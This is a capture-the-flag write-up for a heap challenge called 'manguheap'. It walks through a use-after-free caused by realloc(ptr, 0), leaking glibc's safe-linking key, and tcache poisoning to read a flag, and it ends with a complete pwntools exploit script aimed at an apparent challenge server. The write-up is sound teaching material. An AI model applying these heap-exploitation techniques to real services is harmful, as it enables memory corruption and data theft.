# Writeup: manguheap (UAF + Tcache Poisoning + Safe-Linking Bypass)

> **By:** Randy Nin

---

## Initial Reconnaissance

As always, the first thing to do is check the binary type and which protections it has enabled:  
![](resources/Pasted%20image%2020260925162225.png)

> **Info:** We can observe:
> 
> - It is a Linux binary (ELF).
> - 64-bits.
> - Not Stripped: this means we can read the decompiled code in Ghidra much more easily.
> - All protections enabled: Full RELRO, Canary, NX and PIE.

When running the binary we find a menu format where we pass the option number in the input:  
![](resources/Pasted%20image%2020260925212837.png)

---

## Static Analysis (Understanding the program's logic)

Let's look at the decompiled binary in **Ghidra** and let's review the `main` function.  
![](resources/Pasted%20image%2020260925224243.png)

We notice that before showing the menu (`loop_menu()`), the program calls a function that looks very interesting for this challenge named `guardar_secreto()`.  
![](resources/Pasted%20image%2020260925230844.png)

> **Info:** If we analyze line by line what `guardar_secreto()` does, we see the following flow:
> 
> - It uses `getenv("SECRETO")` to read the flag from the environment variables.
> - It calculates its length using `strnlen(local_20, 0x4f)`, making sure it reads at most 79 characters.
> - It calls `malloc(0x50)` to reserve a block of exactly 80 bytes on the Heap.
> - Finally, it uses `memcpy` to copy the flag's content into that freshly reserved block and places a null byte at the end to terminate the string.

This way we know that we don't need to inject any shellcode or do a ROP chain (which would also be complex to do due to the protections). The flag is already loaded in the heap memory in a space of size `0x50`. Basically we can say that this challenge turns into a reading challenge; the goal is to somehow trick the program into assigning us a pointer to that memory address and printing its content.

If we review the rest of the functions in Ghidra, we notice that the program interacts with the Heap and keeps a record of our allocations using a global array (array) named `platanos`.

Let's analyze how the main menu options work:

**Add Platano (`agregar platano`) **  
![](resources/Pasted%20image%2020260926000501.png)

When we choose to add a plátano, the program asks us for a size (limited to a maximum of `0x50` bytes). It calls `malloc(size)` to request memory from the system and then goes through the global `platanos` array looking for an empty space (an index that is equal to `0`). When it finds one, it stores the memory address that `malloc` gave us at that index and uses a `read` for us to write the content.

**Delete plátano (`eliminar_platano`) **  
![](resources/Pasted%20image%2020260926000700.png)

It asks us for an index, verifies that it is valid and calls `free()` to free that memory from the Heap. But let's notice what it does right after: `*(undefined8 *)(platanos + uVar1 * 8) = 0;` By assigning a `0` to the array index, the developer is destroying the pointer. This means that **this function is safe** and is not vulnerable to **Use-After-Free (UAF)**, because the program no longer "remembers" the memory address it just freed.

**View plátano (`ver_platano`)**  
![](resources/Pasted%20image%2020260926001116.png)

It simply asks us for an index, verifies that there is a pointer stored there (`!= 0`), and calls `write_str()` to print whatever is at that memory address. This will be the function we use to read the flag once we manage to manipulate the heap.

So far, the code looks fairly secure. The developer clears the pointers when using `free()` and validates the sizes. But we still have one menu function to analyze.

#### Finding the vulnerability (The `editar_platano` bug)

We already saw that `eliminar_platano` destroys the pointer correctly. But, what happens if the user decides to change the size of a plátano that already exists? That's what the `editar_platano` function is for. When analyzing the decompiled code of this function, we come across this logic:

![](resources/Pasted%20image%2020260926003640.png)

> **Info:** Analyzing the code and program flow we see the following:
> 
> - It takes the pointer of our plátano from the `platanos` array and stores it in a local variable (Ghidra calls it `local_30`).
> - It uses `malloc_usable_size()` to see how much real space that block has allocated on the heap.
> - It asks us for a new size (`__size`).
> - If the new size is different from the one we already had, it calls the `realloc()` function to resize the memory block.

The critical flaw is found right in this part of the code:  
![](resources/Pasted%20image%2020260926023235.png)

To better understand why this is a vulnerability, we need to understand how `realloc` works in C. According to the Linux manual: _"If size is equal to zero, and ptr is not NULL, then the call is equivalent to free(ptr)"_.

That is, calling `realloc(pointer, 0)` is exactly the same as doing a `free(pointer)`. It frees the memory, returning it to the system, and the function returns a null pointer (`NULL` or `0x0`).

Knowing this, if we tell the program that we want to "edit" a plátano so that it has a size equal to 0, the following would happen:

1. The program executes `realloc(local_30, 0)`.
2. The Heap **frees** our memory block.
3. `realloc` returns `0x0` and it is stored in the variable `local_30`.
4. The program reaches the conditional: `if (local_30 == (void *)0x0)` (it validates that the variable `local_30` is equal to `0x0`). Since our variable is now zero, this is **true**.
5. It prints "No se pudo asignar memoria" on the screen.

##### The logic flaw

Since the program flow entered the `if`, it completely skips the block of code in the `else`. This block of code in the `else` is in charge of updating the global `platanos` array. Since this line never got executed, the program never erases the old memory address from the array.

At the program level, this array (`platanos`) still has the memory address, but at the operating system level, this memory was already freed and declared as empty.

This way we have managed to achieve a **Use-After-Free (UAF)**. We have created a Dangling Pointer.

> **Definitions:**
> 
> - **Use-After-Free (UAF):** a software vulnerability that occurs when a program keeps using a pointer (a reference to a memory address) after that memory has been freed or returned to the system.
> - **Dangling Pointer:** is a pointer that keeps pointing to a memory address that has already been freed or is no longer valid.

---

## Tcache and Safe-Linking

We already have a way to interact with freed memory; our main plan would be to write into it in order to corrupt the heap's management list (specifically the list known as the Tcache).

> **Definition:**  
> The **tcache** (or thread local caching) is a temporary storage mechanism in the _heap_ memory introduced in GNU's C standard library (glibc 2.26) to speed up memory allocation and freeing in multithreaded programs.

But if we look at the version of `glibc` that we were provided, we can observe that it is very modern:  
![](resources/Pasted%20image%2020260926161606.png)

Starting from version 2.32, GLIBC introduced a protection called **Safe-Linking**. It consists of the following: when you free a block and it is stored in the Tcache, the Heap needs to store a pointer (`fd` or forward pointer) that points to the next free block. Before, this pointer was stored in clear text inside our freed block. If we could read it (with a UAF), we knew where the Heap was. If we could write it, we controlled the next `malloc`.

With Safe-Linking, GLIBC "encrypts" this pointer using an XOR operation (`^`) against the very address where the chunk is located, shifted 12 bits to the right (`>> 12`).

The mathematical formula that the system uses is: `Encrypted_Pointer = Target_Address ^ (Current_Chunk_Address >> 12)`

This means two things for the exploit to make:

1. We cannot simply write the flag's address (`flag_heap`) into the freed memory. We must first encrypt it.
2. To encrypt it, we necessarily need to know the base address where the Heap is located (Heap Base).

---

## Understanding the memory leak

As we already saw, GLIBC encrypts the Tcache pointers using the formula:  
`Encrypted_Pointer = Target_Address ^ (Current_Chunk_Address >> 12)`

If we want to achieve a Tcache Poisoning, we need the obfuscation key `(Current_Chunk_Address >> 12)`. This is simply the heap base address shifted 12 **bits** to the right. But, how do we get this key if we don't know any of the values?

To understand how to get this key, we need to understand how the Heap's internal structure and the binary XOR operation (`^`) combine.

> **How the Tcache works:**  
> The Tcache (Thread Local Caching) is an array of **Singly Linked Lists**. Each list stores blocks (chunks) of a specific size that have been freed, managing them under the **LIFO** principle (Last In, First Out*). That is, it acts like a stack of books: the last block you free is placed at the top of the stack, and it will be the first one the system returns to you when you request memory again.

When a block is in use, it contains the user's data (our "Instructions for the chef"). But when we do a `free()`, the block no longer needs to store that data. To avoid spending extra memory, `glibc` recycles that same space: it takes the first 8 bytes of what used to be our data and writes there a pointer named **`fd`** (forward pointer).

The only function of the `fd` pointer is to store the memory address of the block that was below it.

**What happens when we free a block and the Tcache is completely empty?**  
Since there is no previously freed block in the list, our chunk becomes the first and only element (the base of the stack). Since it has no one below it to point to, `glibc` must mark the end of the list. Therefore, the `fd` pointer (`Target_Address`) is necessarily set to **`NULL` (that is, `0x0`)**.

And this is how the cryptographic protection breaks. The Safe-Linking formula is: `Stored_Pointer = Target_Address ^ Mathematical_Key`. Since our chunk is the only one in the Tcache, its `Target_Address` is `0`. The equation literally becomes: `Stored_Pointer = 0 ^ Mathematical_Key`.

By the mathematical laws of the XOR operation, any value operated against zero is equal to itself (`X ^ 0 = X`). Thanks to this, instead of storing an encrypted pointer, the Heap stores the pure mathematical key out in the open in the first 8 bytes of our block. We just have to use our UAF vulnerability to read (print) that block and see the key.

---

## Performing the memory leak (pwntools)

Taking all this mathematical theory to our exploitation script (using the `pwntools` library), the steps to steal the key are simple:

1. We create two plátanos of the same size (`0x50`): Index 0 and Index 1. (We will use Index 1 later).
2. We free **only Index 0** using our UAF vulnerability: `editar_platano(0, 0)`.
3. We use `ver_platano(0)`. Since the program didn't erase the global pointer, it will read the freed memory and hand us the key.

```python
#!/usr/bin/env python3

from pwn import *

# Local binary configuration (for symbols/offsets if required)
exe = './manguheap'
context.binary = exe

# ==========================================
# REMOTE CONFIGURATION (CHANGE THIS DATA)
# ==========================================
REMOTE_HOST = '127.0.0.1'
REMOTE_PORT = 1234
# ==========================================

def start():
    if args.REMOTE:
        return remote(REMOTE_HOST, REMOTE_PORT)
    else:
        return process(exe)

p = start()

# ==========================================
# HELPER FUNCTIONS
# ==========================================
def agregar(size, data):
    p.sendlineafter(b': ', b'1')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)

def editar(idx, size, data=b''):
    p.sendlineafter(b': ', b'4')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', str(size).encode())
    if size != 0:
        p.sendafter(b': ', data)

def ver(idx):
    p.sendlineafter(b': ', b'3')
    p.sendlineafter(b': ', str(idx).encode())
    p.recvuntil(b'chef: ')
    return p.recvline().strip()


# Phase 1: Memory Leak
log.info("Creating plátanos for the Leak...")
agregar(0x50, b'A' * 0x50) # Index 0
agregar(0x50, b'B' * 0x50) # Index 1

log.info("Freeing Plátano 0 (UAF)...")
editar(0, 0) # Frees and leaves the pointer dangling

leak_crudo = ver(0)
mask = u64(leak_crudo.ljust(8, b'\x00'))
heap_base = mask << 12

log.success(f"Safe-Linking Mask: {hex(mask)}")
log.success(f"Heap Base: {hex(heap_base)}")
```

When running this, we manage to obtain the exact base of the Heap:  
![](resources/Pasted%20image%2020260926183054.png)

---

## Looking for the flag's Offset

We already know where the Heap starts (`heap_base`). Now we need to know at what exact distance the block where the `guardar_secreto()` function stored our flag is located.

Since the Heap is allocated sequentially and deterministically at the start of a program, the distance (offset) between the start of the Heap and the flag's block **will always be the same**, no matter how many times the addresses change due to ASLR.

![](resources/Pasted%20image%2020260926184248.png)

Analyzing GDB's output:

1. The program stops exactly at the instruction `mov qword ptr [rip + 0x2cf5], rax`. This is where the flag's address is going to be stored.
2. We print the value of the return register using `print/x $rax`, which gives us `0x5555555592a0`. That's where the flag is located.
3. We use pwndbg's `heap` command and see that our Heap Base (the first allocated chunk) starts at `0x555555559000`.

Here we run into a critical logical design problem if we want to exploit this. If we poison the Tcache so that it assigns us exactly the address `0x2a0`, the program will ask us to enter the data of the "new plátano" through the `read_bytes()` function. If we write there, we are going to overwrite the flag before we can read it.

To avoid this, instead of pointing to the chunk's data zone (`0x2a0`), we are going to point to the chunk's **Header**. In `glibc`, a chunk's header is exactly 16 bytes (`0x10`). If we point to `0x290`, we will be able to write harmless junk over the block's metadata, without touching the flag.

As we discussed earlier, we don't want to overwrite the flag's data, but its **Header**. Knowing that the header is 16 bytes (`0x10`), our final math in the script would be like this:

```python
# Phase 2: Math 
offset_flag = 0x2a0
target_addr = heap_base + offset_flag - 0x10 # Points to the chunk's header

# We apply the XOR formula to bypass GLIBC Safe-Linking
obfuscated_ptr = target_addr ^ mask
```

---

## Tcache poisoning

It's the moment of truth: we are going to corrupt the memory manager's internal list.

We already have Index 0 freed. Now, we are going to free our second plátano (Index 1). When we do this, the Tcache now thinks that the free memory list is: `Chunk 1 -> Chunk 0 -> NULL`.

Our goal is to use the `editar_platano` function to **write** inside the memory of Chunk 1 (which is already freed) and overwrite its `fd` pointer with our obfuscated address.

![](resources/Pasted%20image%2020260926190128.png)

Here we face a small obstacle from the developer. The function verifies that the new size we pass is less than `0x51`. If we tried to pass the real usable size of the block (e.g. `0x58`) to skip the `realloc`, the program would print "Tamaño inválido" and abruptly close the execution (`exit code 0`).

> **The magic of the Tcache in `realloc`** When a block is in the Tcache, the Heap does **not** turn off the "In Use" bit (`PREV_INUSE`) of the adjacent blocks. For the `realloc` function, that block still appears to be completely occupied and valid. Therefore, we can pass it the size `0x50` again in a totally safe way. `realloc` will see that the block already has that size, will do absolutely nothing, and will return the pointer to us, letting us write into it without breaking the program.

We send our payload with the encrypted address:

```python
# Phase 3: Tcache Poisoning
log.info("Freeing Plátano 1...")
editar(1, 0) # The list is now: Chunk 1 -> Chunk 0

log.info("Writing the malicious pointer into Plátano 1's fd...")
payload = p64(obfuscated_ptr).ljust(0x50, b'X')
editar(1, 0x50, payload)
```

When we do this, the Tcache has just been poisoned. The internal free memory list now looks like this: `Chunk 1 -> Our target address (Target Header)! -> ...`

---

## Obtaining the flag

With the Tcache poisoned, the free block list of size `0x50` looks like this: `Chunk 1 -> Flag's Header Address -> ...`

Now we just have to ask the memory manager to assign us blocks. First, we create a plátano (Index 2) to consume `Chunk 1` and take it out of the list.

```python
log.info("Emptying the first block of the Tcache...")
agregar(0x50, b'JUNK\n') # Will take index 2
```

Now the first available block in the Tcache is **our target address**. We call `agregar_platano` (Index 3) so that the system assigns us the space where the flag resides.

Here the final trick comes into play. When reclaiming this block, the program forces us to send it "Instructions for the chef" through the `read_bytes()` function. If we send it normal data and press "Enter" (which sends a newline `\n`), the function will automatically place a **null byte (`\0`)** at the end of our string. That null byte would corrupt the adjacent memory or cut off the printing of the flag.

> **The null byte bypass in `read_bytes`:**  
> If we send _exactly_ the amount of bytes we requested (or fill the buffer without sending a `\n`), the `read_bytes` function doesn't place the terminating null byte.  
> Since we point to the Header (which is exactly 16 bytes), we will send **exactly 16 "A" characters** using `p.send()` (without a newline). This will overwrite the header cleanly without leaving null bytes in between.

```python
log.info("Reclaiming the flag's address!")
p.sendlineafter(b': ', b'1')
p.sendlineafter(b': ', b'80') 
p.recvuntil(b'chef: ')

# We send 16 'A's without a newline to overwrite the header cleanly
p.send(b'A' * 16) 
```

As a result, the memory will look like this: `[16 bytes of 'A'] + [The bytes of our flag]`. Since there is no null byte between them, when we use the view plátano option, the `write_str` function will print the 16 'A's and continue printing straight through until it spits out the secret.

```python
log.success("Extracting the secret...")
p.sendlineafter(b': ', b'3')
p.sendlineafter(b': ', b'3')
p.recvuntil(b'chef: AAAAAAAAAAAAAAAA') # We filter out the A's

flag = p.recvline().decode(errors='ignore').strip()
log.success(f"FLAG: {flag}")
```

## Complete Exploit (Final script)

Putting everything together (Leak, Math, Poisoning and Pwn), the `pwntools` script ends up as follows, also prepared to run in the remote environment if the `REMOTE` argument is passed:

```python
from pwn import *

# Local binary configuration (for symbols/offsets if required)
exe = './manguheap'
context.binary = exe

# ==========================================
# REMOTE CONFIGURATION (CHANGE THIS DATA)
# ==========================================
REMOTE_HOST = '34.135.253.132'
REMOTE_PORT = 34438
# ==========================================

def start():
    if args.REMOTE:
        return remote(REMOTE_HOST, REMOTE_PORT)
    else:
        return process(exe)

p = start()

# ==========================================
# HELPER FUNCTIONS
# ==========================================
def agregar(size, data):
    p.sendlineafter(b': ', b'1')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)

def editar(idx, size, data=b''):
    p.sendlineafter(b': ', b'4')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', str(size).encode())
    if size != 0:
        p.sendafter(b': ', data)

def ver(idx):
    p.sendlineafter(b': ', b'3')
    p.sendlineafter(b': ', str(idx).encode())
    p.recvuntil(b'chef: ')
    return p.recvline().strip()

# ==========================================
# PHASE 1: LEAK (The Memory Leak)
# ==========================================
log.info("Creating plátanos for the Leak...")
agregar(0x50, b'A' * 0x50) # Index 0
agregar(0x50, b'B' * 0x50) # Index 1

log.info("Freeing Plátano 0 (UAF)...")
editar(0, 0) # Frees and leaves the pointer dangling

leak_crudo = ver(0)
mask = u64(leak_crudo.ljust(8, b'\x00'))
heap_base = mask << 12

log.success(f"Safe-Linking Mask: {hex(mask)}")
log.success(f"Heap Base: {hex(heap_base)}")

# ==========================================
# PHASE 2: MATH (Calculate the target)
# ==========================================
offset_flag = 0x2a0
target_addr = heap_base + offset_flag - 0x10 # Points to the chunk's header

# We apply the XOR formula to bypass GLIBC Safe-Linking
obfuscated_ptr = target_addr ^ mask
log.info(f"Pointing to the target: {hex(target_addr)}")
log.info(f"Obfuscated Pointer to inject: {hex(obfuscated_ptr)}")

# ==========================================
# PHASE 3: POISONING (Poison the Tcache)
# ==========================================
log.info("Freeing Plátano 1...")
editar(1, 0) 

log.info("Writing the malicious pointer into Plátano 1's fd...")
payload = p64(obfuscated_ptr).ljust(0x50, b'X')
editar(1, 0x50, payload)

# ==========================================
# PHASE 4: PWN (Capture the Flag)
# ==========================================
log.info("Emptying the first block of the Tcache...")
agregar(0x50, b'JUNK\n') # Will take index 2

log.info("Reclaiming the flag's address!")
p.sendlineafter(b': ', b'1')
p.sendlineafter(b': ', b'80') 
p.recvuntil(b'chef: ')

# We send 16 'A's without a newline to overwrite the header cleanly
p.send(b'A' * 16) 

log.success("Extracting the secret...")
p.sendlineafter(b': ', b'3')
p.sendlineafter(b': ', b'3')
p.recvuntil(b'chef: AAAAAAAAAAAAAAAA') # We filter out the A's

flag = p.recvline().decode(errors='ignore').strip()
log.success(f"FLAG: {flag}")
```

![](resources/Pasted%20image%2020260926190937.png)

